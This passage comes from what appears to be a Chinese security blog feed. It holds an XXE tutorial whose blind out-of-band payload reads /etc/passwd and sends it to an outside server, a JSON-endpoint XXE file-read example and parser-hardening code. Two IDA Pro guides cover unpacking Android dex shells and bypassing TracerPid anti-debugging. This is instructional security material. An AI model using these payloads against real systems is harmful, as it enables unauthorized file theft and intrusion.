很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</p><p><strong>实验二：无回显读取本地敏感文件(Blind OOB XXE)</strong></p><p><strong>test.dtd</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=file:///etc/passwd"</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://192.168.137.131:9999?p=%file;'&gt;"</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>Payload:</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://192.168.137.131:8081/test.dtd"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;%int;%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure><p>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上。</p><p><img src="https://img-blog.csdnimg.cn/20200222114723266.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>问题1：带外数据通道的建立是使用嵌套形式，利用外部实体中的URL发出访问，从而跟攻击者的服务器发生联系<br>直接在内部实体定义中引用另一个实体的方法如下，但是这种方法行不通，解析直接报错。</p><p><img src="https://img-blog.csdnimg.cn/20200222114807653.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>问题2：</p><p>但是这样做行不通，原因是不能在实体定义中引用参数实体，即有些解释器不允许在内层实体中使用外部连接，无论内层是一般实体还是参数实体。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">convert</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=file:///etc/passwd"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">int</span> <span class="meta-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'http://192.168.137.131:9999?p=%file;'&gt;"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%send;]&gt;</span></span><br></pre></td></tr></table></figure><p><strong>解决方案：</strong>将嵌套的实体声明放入到一个外部文件中，这里一般是放在攻击者的服务器上，这样做可以规避错误。</p><p><strong>新的利用：</strong><br>所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议<br>如图所示:<br><img src="https://img-blog.csdnimg.cn/20200222114956235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>实验三、JSON content-type XXE</strong></p><p>正如我们所知道的，很多web和移动应用都基于客户端-服务器交互模式的web通信服务。不管是SOAP还是RESTful，一般对于web服务来说，最常见的数据格式都是XML和JSON。尽管web服务可能在编程时只使用其中一种格式，但服务器却可以接受开发人员并没有预料到的其他数据格式，这就有可能会导致JSON节点受到XXE（XML外部实体）攻击<br>原始请求和响应：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 38</span><br><span class="line">&#123;"search":"name","value":"netspitest"&#125;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 43</span><br><span class="line">&#123;"error": "no results for name netspitest"&#125;</span><br></pre></td></tr></table></figure><p>现在我们尝试将 Content-Type 修改为 application/xml<br>进一步请求和响应：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 38</span><br><span class="line">&#123;"search":"name","value":"netspitest"&#125;</span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line">HTTP/1.1 500 Internal Server Error</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 127</span><br><span class="line">&#123;"errors":&#123;"errorMessage":"org.xml.sax.SAXParseException: XML document structures must start and end within the same entity."&#125;&#125;</span><br></pre></td></tr></table></figure><p>可以发现服务器端是能处理 xml 数据的，于是我们就可以利用这个来进行攻击<br>最终的请求和响应：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">HTTP Request:</span><br><span class="line">POST /netspi HTTP/1.1</span><br><span class="line">Host: someserver.netspi.com</span><br><span class="line">Accept: application/json</span><br><span class="line">Content-Type: application/xml</span><br><span class="line">Content-Length: 288</span><br><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">netspi</span> [<span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///etc/passwd"</span> &gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">search</span>&gt;</span>name<span class="tag">&lt;/<span class="name">search</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">value</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br><span class="line"></span><br><span class="line">HTTP Response:</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Type: application/json</span><br><span class="line">Content-Length: 2467</span><br><span class="line">&#123;"error": "no results for name root:x:0:0:root:/root:/bin/bash</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/bin/sh</span><br><span class="line">bin:x:2:2:bin:/bin:/bin/sh</span><br><span class="line">sys:x:3:3:sys:/dev:/bin/sh</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync....</span><br></pre></td></tr></table></figure><h3 id="0x005-XXE-如何防御"><a href="#0x005-XXE-如何防御" class="headerlink" title="0x005 XXE 如何防御"></a><strong>0x005 XXE 如何防御</strong></h3><p><strong>方案一：使用语言中推荐的禁用外部实体的方法</strong></p><p><strong>PHP：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">libxml_disable_entity_loader(<span class="keyword">true</span>);</span><br></pre></td></tr></table></figure><p><strong>JAVA:</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="keyword">false</span>);</span><br><span class="line">dbf.setFeature(<span class="string">"http://apache.org/xml/features/disallow-doctype-decl"</span>,<span class="keyword">true</span>);</span><br><span class="line">dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-general-entities"</span>,<span class="keyword">false</span>)</span><br><span class="line">dbf.setFeature(<span class="string">"http://xml.org/sax/features/external-parameter-entities"</span>,<span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p><strong>Python：</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure><h3 id="0x006-其他姿势"><a href="#0x006-其他姿势" class="headerlink" title="0x006 其他姿势"></a><strong>0x006 其他姿势</strong></h3><p><strong>利用jar协议配合xxe获取临时文件的目录</strong></p><p>jar:// 协议的格式：jar:{url}!{path}</p><p>jar:<a href="http://vps:8080/jar.zip!/1.php" target="_blank" rel="noopener">http://vps:8080/jar.zip!/1.php</a></p><p>如果jar.zip中不存在1.php 文件，则会报错，并在错误日志中打印临时文件目录</p><p>netdoc:// 列目录，列出某个目录下的文件</p><h3 id="0x007-参考"><a href="#0x007-参考" class="headerlink" title="0x007 参考"></a><strong>0x007 参考</strong></h3><p>【1】<a href="http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">http://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3%20XXE%20%E6%BC%8F%E6%B4%9E/</a><br>【2】<a href="https://www.freebuf.com/articles/web/97833.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/97833.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;0x001-XXE漏洞简介&quot;&gt;&lt;a href=&quot;#0x001-XXE漏洞简介&quot; class=&quot;headerlink&quot; title=&quot;0x001 XXE漏洞简介&quot;&gt;&lt;/a&gt;&lt;strong&gt;0x001 XXE漏洞简介&lt;/strong&gt;&lt;/h3&gt;&lt;p&gt;XXE漏洞全称XM
      
    
    </summary>
    
    
      <category term="CTF" scheme="https://blog.kaide0521.cn/categories/CTF/"/>
    
    
      <category term="XXE漏洞" scheme="https://blog.kaide0521.cn/tags/XXE%E6%BC%8F%E6%B4%9E/"/>
    
  </entry>
  
  <entry>
    <title>IDA Pro脱dex壳过反调试</title>
    <link href="https://blog.kaide0521.cn/2020/01/07/IDA-Pro%E8%84%B1dex%E5%A3%B3%E8%BF%87%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
    <id>https://blog.kaide0521.cn/2020/01/07/IDA-Pro%E8%84%B1dex%E5%A3%B3%E8%BF%87%E5%8F%8D%E8%B0%83%E8%AF%95/</id>
    <published>2020-01-07T13:47:34.000Z</published>
    <updated>2020-01-07T13:48:14.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="IDA-Pro脱dex壳过反调试"><a href="#IDA-Pro脱dex壳过反调试" class="headerlink" title="IDA Pro脱dex壳过反调试"></a>IDA Pro脱dex壳过反调试</h3><p>标签（空格分隔）： Apk逆向</p><hr><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a><strong>1. 前言</strong></h3><p>之前总结了IDA pro脱壳的基本步骤，包括调试步骤和在libdvm.so的dvmDexFileOpenPartial函数出下断点，从内存中dump出dex文件。<br>这次以360一代加壳为例，试着在mmap出下断点和过一些基本的反调试技术。</p><h3 id="2-脱壳环境搭建"><a href="#2-脱壳环境搭建" class="headerlink" title="2. 脱壳环境搭建"></a><strong>2. 脱壳环境搭建</strong></h3><p>这里的环境搭建和上一篇博客一样<a href="http://blog.csdn.net/daide2012/article/details/75675210" target="_blank" rel="noopener">http://blog.csdn.net/daide2012/article/details/75675210</a><br>启动android_server<br>端口转发<br>以调试模式启动应用<br>打开IDA附件进程<br>设置Debugger Option选项<br>运行jdb调试</p><h3 id="3-开始脱壳"><a href="#3-开始脱壳" class="headerlink" title="3. 开始脱壳"></a><strong>3. 开始脱壳</strong></h3><p><strong>3.1 下断点</strong></p><p>找到mmap函数，在此下断点，一般我们读取文件都是使用fopen和fgets函数，但是360壳通过mmap函数读取/proc/pid/status，来检查TracerPid，因此我们应该在mmap函数处下断点</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzI4MjI1MjUwODY5?x-oss-process=image/format,png" alt="这里写图片描述"></p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzI4MjI1MzA5NDky?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>单步调试过程中发现一直重复执行一段代码如下：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzI4MjI1MzIxMDMz?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>我们发现，这是一段循环，测试是增加破解难度，故意设置的，因此我们将循环条件的寄存器值进行更改，让其跳出循环，否则要进行多次单步，按F8按的手痛</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzI4MjI1MzM3MjI1?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>在寄存器列表中点击鼠标右键，修改寄存器R11的值为Ox000000A7,提早退出循环，然后单步调试<br>注意单步都标号为loc_760BF08C处的时候，要进入该函数，然后继续单独调试，我试了好几次，每次执行到此处的代码，自动退出了，因此反调试的实现肯定是由该段代码实现，所以要进入调试</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzI4MjI1MzU3MjUw?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>继续单独调试</p><p>过程中会发现程序读取/proc/pid/status的内容，比较TracerPid的值与0的大小</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzI4MjI1NDEzOTEz?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>此时R0寄存器的值恰好是16进制的值11EF,对应的TracerPid为4591，因此要修改R0寄存器的值为0,绕过范调试检测，然后继续单步<br>执行完后，按F9继续运行mmap函数，因为此时读取的并不一定是dex文件，动态库在装载的时候很多都调用了mmap函数，所以回到mmap继续调试</p><p>注意，程序会多次进行反调试检测，所以在进入反调试的函数处建议下断点，这样可以快速的F9到反调试检测的位置。我在调试的过程中一共按了6,7次才把反调试检测过完，中间按错了好几次，每次都得重头再来，耐心很重要啊！！!</p><p>过了反调试之后，在memcmp处下断点，不断的F9，同时在Hex View窗口主要出现dex.035的字符</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzI4MjI1NDI5MzU0?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>终于看到dex.035这个字样了，下面的工作使用脚本将dex文件从内存中dump出</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzI4MjI1NDQ0MTg0?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>之后即可直接采用脚本dump出dex文件</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;IDA-Pro脱dex壳过反调试&quot;&gt;&lt;a href=&quot;#IDA-Pro脱dex壳过反调试&quot; class=&quot;headerlink&quot; title=&quot;IDA Pro脱dex壳过反调试&quot;&gt;&lt;/a&gt;IDA Pro脱dex壳过反调试&lt;/h3&gt;&lt;p&gt;标签（空格分隔）： Apk逆
      
    
    </summary>
    
    
      <category term="移动安全" scheme="https://blog.kaide0521.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="App脱壳" scheme="https://blog.kaide0521.cn/tags/App%E8%84%B1%E5%A3%B3/"/>
    
      <category term="IDA Pro" scheme="https://blog.kaide0521.cn/tags/IDA-Pro/"/>
    
      <category term="Apk逆向" scheme="https://blog.kaide0521.cn/tags/Apk%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>IDA Pro脱dex壳初探</title>
    <link href="https://blog.kaide0521.cn/2020/01/07/IDA-Pro%E8%84%B1dex%E5%A3%B3%E5%88%9D%E6%8E%A2/"/>
    <id>https://blog.kaide0521.cn/2020/01/07/IDA-Pro%E8%84%B1dex%E5%A3%B3%E5%88%9D%E6%8E%A2/</id>
    <published>2020-01-07T13:45:43.000Z</published>
    <updated>2020-01-07T13:55:34.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="IDA-Pro脱dex壳初探"><a href="#IDA-Pro脱dex壳初探" class="headerlink" title="IDA Pro脱dex壳初探"></a>IDA Pro脱dex壳初探</h3><p>标签（空格分隔）： Apk逆向</p><hr><h3 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h3><p>关于IDA Pro的介绍，已不用多说了，是目前最棒的一个静态反编译软件，编程天才的杰作。这里的脱壳实战我们以阿里比赛样本AliCrackme_3.apk样本为例。</p><h3 id="2-调试环境的搭建"><a href="#2-调试环境的搭建" class="headerlink" title="2. 调试环境的搭建"></a>2. 调试环境的搭建</h3><h4 id="2-1-安装IDA-Pro"><a href="#2-1-安装IDA-Pro" class="headerlink" title="2.1 安装IDA Pro"></a><strong>2.1 安装IDA Pro</strong></h4><p>[下载地址][1]<br>直接解压运行</p><h4 id="2-2-使用IDA进行调试设置"><a href="#2-2-使用IDA进行调试设置" class="headerlink" title="2.2 使用IDA进行调试设置"></a><strong>2.2 使用IDA进行调试设置</strong></h4><p>在IDA安装目录dbgsrv下获取android_server命令文件<br>运行命令：</p><pre><code>adb rootadb remountadb push android_server /data   #将文件拷贝到手机data目录adb shellcd /datachmod 755 android_server    #更改权限，赋予可执行权限./android_server            #运行root@Che1:/data # ./android_serverIDA Android 32-bit remote debug server(ST) v1.17. Hex-Rays (c)     2004-2014Listening on port #23946...</code></pre><p>错误1：error: only position independent executables (PIE) are supported<br>这个主要是Android5.0以上的编译选项默认开启了pie，在5.0以下编译的原生应用不能运行，有两种解决办法，一种是用Android5.0以下的手机进行操作，还有一种就是用IDA6.6+版本即可。</p><h4 id="2-3-配置端口转发"><a href="#2-3-配置端口转发" class="headerlink" title="2.3 配置端口转发"></a><strong>2.3 配置端口转发</strong></h4><p>这里开始监听了设备的23946端口，那么如果要想让IDA和这个android_server进行通信，那么必须让PC端的IDA也连上这个端口，那么这时候就需要借助于adb的一个命令了：<br><strong>adb forward tcp:远端设备端口号(进行调试程序端) tcp:本地设备端口(被调试程序端)</strong><br>另起一个cmd,运行命令<br>    adb forward tcp:23946 tcp:23946</p><h4 id="2-4-以debug模式启动apk"><a href="#2-4-以debug模式启动apk" class="headerlink" title="2.4 以debug模式启动apk"></a><strong>2.4 以debug模式启动apk</strong></h4><pre><code>adb shell am start -D -n com.ali.tg.testapp/.MainActivity</code></pre><h4 id="2-5-使用IDA进行连接"><a href="#2-5-使用IDA进行连接" class="headerlink" title="2.5 使用IDA进行连接"></a><strong>2.5 使用IDA进行连接</strong></h4><p>选择Debugger-&gt;Attach-&gt;Remote ARMLinux/Android debugger</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzIxMjEzMjIxMDc3?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>点击OK按钮，按ctrl+F搜索com.ali进行进程附加操作</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzIxMjEzMjM0MjQx?x-oss-process=image/format,png" alt="这里写图片描述"></p><h4 id="2-6-启动jdb调试器"><a href="#2-6-启动jdb调试器" class="headerlink" title="2.6 启动jdb调试器"></a><strong>2.6 启动jdb调试器</strong></h4><pre><code>jdb -connect com.sun.jdi.SocketAttach:hostname=127.0.0.1,port=8700</code></pre><p>处于等待状态</p><p><img src="https://img-blog.csdnimg.cn/20200107215447785.PNG?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2RhaWRlMjAxMg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="2-7-下断点"><a href="#2-7-下断点" class="headerlink" title="2.7 下断点"></a><strong>2.7 下断点</strong></h4><p>给dvmDexFileOpenPartial函数下断点，原因如下：<br>dvmDexFileOpenPartial这个函数是最终分析dex文件，加载到内存中的函：</p><pre><code>int dvmDexFileOpenPartial(const void* addr, int len, DvmDex** ppDvmDex);</code></pre><p>第一个参数就是dex内存起始地址，第二个参数就是dex大小。</p><p>找到dvmDexFileOpenPartial的函数地址<br>IDA静态分析libdvm.so得到这个函数的相对地址为Ox46CCC</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzIxMjEzMzA1OTg0?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>按Ctrl + S查看libdvm.so在虚拟内存中的映射位置</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzIxMjEzMzI2MDUx?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>然后将两者相加得到绝对地址：Ox46CCC + Ox415CA000 = Ox41610CCC，使用G键，跳转：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzIxMjEzMzQxNzQ4?x-oss-process=image/format,png" alt="这里写图片描述"></p><h4 id="2-8-点击运行按钮或者F9-然后按F8进行单步调试"><a href="#2-8-点击运行按钮或者F9-然后按F8进行单步调试" class="headerlink" title="2.8 点击运行按钮或者F9,然后按F8进行单步调试"></a><strong>2.8 点击运行按钮或者F9,然后按F8进行单步调试</strong></h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzIxMjEzMzU0OTg5?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>其中R0和R1就是传递给dvmDexFileOpenPartial的参数，R0对应于addr，R1对应于len,也就是dex文件的长度</p><p>然后按下Shirt+F2 调出IDA的脚本运行界面</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzIxMjEzNDIwOTM5?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>然后使用jeb工具打开dump到的dex文件</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNzIxMjEzNDM3MDQ2?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>于是得到了被加固的dex文件</p><h4 id="2-9-总结"><a href="#2-9-总结" class="headerlink" title="2.9 总结"></a><strong>2.9 总结</strong></h4><p>该样本直接使用dvmDexFileOpenPartial函数实现dex的文件加载，我们直接可在改函数出下断点，然后从内存中直接dump出dex文件，是一个比较简单样例，也算是复习下IDA pro调试的基本步骤，然后真正的现实情况并没有这么简单，很多多应用会采取一系列额反调试手段，比如：</p><p><strong>SO的反调试</strong><br>IDA是使用android_server在root环境下注入到被调试的进程中，那么这里用到一个技术就是Linux中的ptrace<br>那么Android中如果一个进程被另外一个进程ptrace了之后，在他的status文件中有一个字段：TracerPid 可以标识是被哪个进程trace了，我们可以使用命令查看我们的被调试的进行信息：<br>status文件在：/proc/[pid]/status<br>如果检测到这个字段不为0，说明当前so文件正在被调试，这是一种常用的反调试技术</p><p>还有有些加固的apk对dex文件的加载不一定就走dvmDexFileOpenPartial进行加载，会自己实现dex文件的加载函数，但不管怎么样，最终还是会使用mmap内存映射函数，所以下断点的地方又有所区别。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;IDA-Pro脱dex壳初探&quot;&gt;&lt;a href=&quot;#IDA-Pro脱dex壳初探&quot; class=&quot;headerlink&quot; title=&quot;IDA Pro脱dex壳初探&quot;&gt;&lt;/a&gt;IDA Pro脱dex壳初探&lt;/h3&gt;&lt;p&gt;标签（空格分隔）： Apk逆向&lt;/p&gt;
&lt;h
      
    
    </summary>
    
    
      <category term="移动安全" scheme="https://blog.kaide0521.cn/categories/%E7%A7%BB%E5%8A%A8%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="App脱壳" scheme="https://blog.kaide0521.cn/tags/App%E8%84%B1%E5%A3%B3/"/>
    
      <category term="IDA Pro" scheme="https://blog.kaide0521.cn/tags/IDA-Pro/"/>
    
      <category term="Apk逆向" scheme="https://blog.kaide0521.cn/tags/Apk%E9%80%86%E5%90%91/"/>
    
  </entry>
  
  <entry>
    <title>App虚拟化技术初探</title>
    <link href="https://blog.kaide0521.cn/2020/01/07/App%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E5%88%9D%E6%8E%A2/"/>
    <id>https://blog.kaide0521.cn/2020/01/07/App%E8%99%9A%E6%8B%9F%E5%8C%96%E6%8A%80%E6%9C%AF%E5%88%9D%E6%8E%A2/</id>
    <published>2020-01-07T13:43:45.000Z</published>
    <updated>2020-01-07T13:44:26.000Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Plugin-Technology-Background"><a href="#Plugin-Technology-Background" class="headerlink" title="Plugin Technology Background"></a><strong>Plugin Technology Background</strong></h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAyOTM3MTA1?x-oss-process=image/format,png" alt="这里写图片描述"></p><p>App插件开发技术或App虚拟化技术以及App热修复技术，最近几年非常火热和流行，图中列举了两种主要的需求，第一种需求是很多时候我们想在Android手机上同时登陆多个社交应用，比如QQ或者微信，在Android原生系统中肯定是无法支持的，只有登出一个账号后然后在换另外一个，因此衍生APP虚拟化技术；另外一种需求是一个大的APK文件我想分批次发布，防止一次性发布下载时间过长而损害用户体验，因此我把不同的功能以插件的形式发布，这个插件同样是APK文件，同样对于某一种功能的升级或者bug的修复都可以采用这种技术来实现。</p><h3 id="What-is-Android-Plugin-Technology"><a href="#What-is-Android-Plugin-Technology" class="headerlink" title="What is Android Plugin Technology?"></a><strong>What is Android Plugin Technology?</strong></h3><ul><li>Launch an APK file within an Android app.<br>在一个APP内部启动一个APP</li><li>In the unrooted device.<br>不需要root手机</li><li>“Host App” = Android app.</li><li>“Plugin” = APK file.</li><li>No need to install the plugin.<br>这里的无需安装主要是指对系统来说，并没有实地安装，，创建沙箱环境，以用户的视角来看还是与host app一样，点击安装，然后正常运行</li></ul><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzMjAzNTQw?x-oss-process=image/format,png" alt="这里写图片描述"></p><h3 id="现有的插件框架"><a href="#现有的插件框架" class="headerlink" title="现有的插件框架"></a><strong>现有的插件框架</strong></h3><p><img src="https://imgconvert.csdnimg.cn/aHR0cDovL2ltZy5ibG9nLmNzZG4ubmV0LzIwMTcwNjI0MTAzMjMxODQ1?x-oss-process=image/format,png" 